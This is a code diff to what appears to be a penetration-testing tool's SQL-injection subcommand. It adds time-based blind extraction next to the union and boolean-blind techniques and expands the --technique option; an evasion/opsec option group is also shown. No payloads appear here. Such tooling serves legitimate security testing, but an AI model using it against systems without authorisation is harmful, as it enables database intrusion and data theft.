@@ -201,29 +201,42 @@ def cmd_sql(args) -> None:
 
     p = urlsplit(url)
     c.info(f"injecting '{param}' at {p.scheme}://{p.netloc}{p.path}")
-    c.info("calibrating boolean-blind oracle…")
-    oracle = sqli.calibrate(net, url, param, value, console=c)
-    if oracle is None:
+
+    # Pick a technique: union (whole values per request — fast) when output is
+    # reflected, else boolean-blind (a char at a time), else time-based (a
+    # delayed request per bit — works when nothing leaks at all).
+    oracle, union = None, None
+    if args.technique != "time":
+        c.info("calibrating boolean-blind oracle…")
+        oracle = sqli.calibrate(net, url, param, value, console=c)
+
+    if oracle is not None:
+        c.good(f"injectable — {oracle.context} context")
+        dbms = sqli.fingerprint(oracle)
+        if args.technique in ("auto", "union"):
+            setup = sqli.union_setup(net, oracle)
+            if setup:
+                union = (dbms, *setup)
+                c.good(f"union-based — {setup[0]} columns, output reflected (fast)")
+            elif args.technique == "union":
+                c.bad("no usable UNION here (no reflected column) — try --technique blind")
+                raise SystemExit(1)
+        if union is None:
+            c.info("boolean-blind extraction (a request per bit — slower)")
+    elif args.technique in ("auto", "time"):
+        c.info("no boolean differential — calibrating time-based oracle…")
+        oracle = sqli.time_calibrate(net, url, param, value, console=c)
+        if oracle is None:
+            c.bad("no injection found here (boolean, union, or time)")
+            raise SystemExit(1)
+        dbms = oracle.dbms
+        c.good(f"time-based — {oracle.n}s per true bit (slow but works on the blind)")
+    else:
         c.bad("no boolean-blind injection here — try another parameter or value")
         raise SystemExit(1)
-    c.good(f"injectable — {oracle.context} context")
-    dbms = sqli.fingerprint(oracle)
+
     prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
     c.good(f"DBMS: {dbms}")
-
-    # Pick the technique: union (reads whole values per request — fast) when the
-    # point reflects output, else boolean-blind (one char at a time).
-    union = None
-    if args.technique in ("auto", "union"):
-        setup = sqli.union_setup(net, oracle)
-        if setup:
-            union = (dbms, *setup)
-            c.good(f"union-based — {setup[0]} columns, output reflected (fast)")
-        elif args.technique == "union":
-            c.bad("no usable UNION here (no reflected column) — try --technique blind")
-            raise SystemExit(1)
-    if union is None:
-        c.info("boolean-blind extraction (a request per bit — slower)")
 
     # Non-interactive (batch) one-shots, else the interactive console.
     if args.banner:
@@ -378,8 +391,8 @@ def build_parser() -> argparse.ArgumentParser:
     sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
     sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
     sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
-    sq.add_argument("--technique", choices=["auto", "union", "blind"], default="auto",
-                    help="auto (union if reflected, else blind) · union · blind")
+    sq.add_argument("--technique", choices=["auto", "union", "blind", "time"], default="auto",
+                    help="auto (union>blind>time) · union · blind · time")
     sq.add_argument("-v", "--verbose", nargs="?", const=1, type=int, default=0, metavar="LEVEL",
                     help="-v 2 prints every injected payload")
     ev = sq.add_argument_group("evasion / opsec")
